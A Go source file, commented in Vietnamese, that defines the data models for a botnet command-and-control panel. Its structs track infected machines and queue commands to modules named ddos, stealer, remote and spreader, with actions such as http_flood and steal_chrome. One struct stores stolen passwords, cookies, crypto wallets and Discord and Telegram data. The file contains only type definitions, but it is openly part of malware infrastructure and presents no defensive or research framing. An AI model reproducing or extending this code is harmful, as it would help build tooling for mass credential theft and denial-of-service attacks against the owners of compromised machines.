package main

import (
    "database/sql"
    "time"
)

// Cau truc Bot dai dien cho 1 may bi nhiem
type Bot struct {
    ID        string    `json:"id"`         // UUID cua bot
    Hostname  string    `json:"hostname"`   // Ten may chu
    OS        string    `json:"os"`         // He dieu hanh (Windows/Linux/MacOS)
    IP        string    `json:"ip"`         // Dia chi IP public
    Country   string    `json:"country"`    // Quoc gia (tu IP geolocation)
    FirstSeen time.Time `json:"first_seen"` // Lan dau ket noi
    LastSeen  time.Time `json:"last_seen"`  // Lan cuoi ket noi
    Status    string    `json:"status"`     // "online" hoac "offline"
    
    // Thong tin he thong chi tiet (cap nhat tu stealer_system)
    CPU       string    `json:"cpu"`
    RAM       string    `json:"ram"`
    GPU       string    `json:"gpu"`
    Disk      string    `json:"disk"`
    LocalIP   string    `json:"local_ip"`
    Arch      string    `json:"arch"`
    Admin     bool      `json:"is_admin"`
}

// Cau truc Command dai dien cho 1 lenh gui den bot
type Command struct {
    ID        string    `json:"id"`         // UUID cua lenh
    BotID     string    `json:"bot_id"`     // ID cua bot nhan lenh
    Module    string    `json:"module"`     // Module: ddos, stealer, remote, spreader
    Action    string    `json:"action"`     // Hanh dong cu the: http_flood, steal_chrome, v.v.
    Params    string    `json:"params"`     // Tham so JSON cho hanh dong
    Status    string    `json:"status"`     // "pending", "executing", "completed", "failed"
    Result    string    `json:"result"`     // Ket qua tra ve tu bot
    CreatedAt time.Time `json:"created_at"`
    UpdatedAt time.Time `json:"updated_at"`
}

// Cau truc StealData chua du lieu bot danh cap duoc
type StealData struct {
    ID        int64     `json:"id"`
    BotID     string    `json:"bot_id"`
    DataType  string    `json:"data_type"`  // "passwords", "cookies", "wallets", "discord", "telegram", v.v.
    Data      string    `json:"data"`        // Du lieu JSON da ma hoa
    Timestamp time.Time `json:"timestamp"`
}

// Cau truc User dai dien cho admin
type User struct {
    Username     string `json:"username"`
    PasswordHash string `json:"password_hash"`
    Token        string `json:"token"` // JWT token hien tai
}

// Cau truc phan hoi tu API
type APIResponse struct {
    Success bool        `json:"success"`
    Message string      `json:"message,omitempty"`
    Data    interface{} `json:"data,omitempty"`
}

// Cau truc lenh gui qua WebSocket
type WSMessage struct {
    Type      string `json:"type"`       // "command", "result", "ping", "pong", "register"
    BotID     string `json:"bot_id,omitempty"`
    CommandID string `json:"command_id,omitempty"`
    Module    string `json:"module,omitempty"`
    Action    string `json:"action,omitempty"`
    Params    string `json:"params,omitempty"`
    Result    string `json:"result,omitempty"`
    Timestamp int64  `json:"timestamp"`
}

// Cau truc dang ky bot
type RegisterRequest struct {
    Hostname string `json:"hostname"`
    OS       string `json:"os"`
    Arch     string `json:"arch"`
    CPU      string `json:"cpu"`
    RAM      string `json:"ram"`
    GPU      string `json:"gpu"`
    Disk     string `json:"disk"`
    LocalIP  string `json:"local_ip"`
    Admin    bool   `json:"is_admin"`
}

// Cau truc dang nhap admin
type LoginRequest struct {
    Username string `json:"username"`
    Password string `json:"password"`
}

// Cau truc gui lenh
type CommandRequest struct {
    BotID  string `json:"bot_id"`  // ID bot hoac "all"
    Module string `json:"module"`
    Action string `json:"action"`
    Params string `json:"params"`
}

// NullableString cho cac truong co the null trong SQL
type NullableString struct {
    sql.NullString
}

// NullableTime cho cac truong thoi gian co the null
type NullableTime struct {
    sql.NullTime
}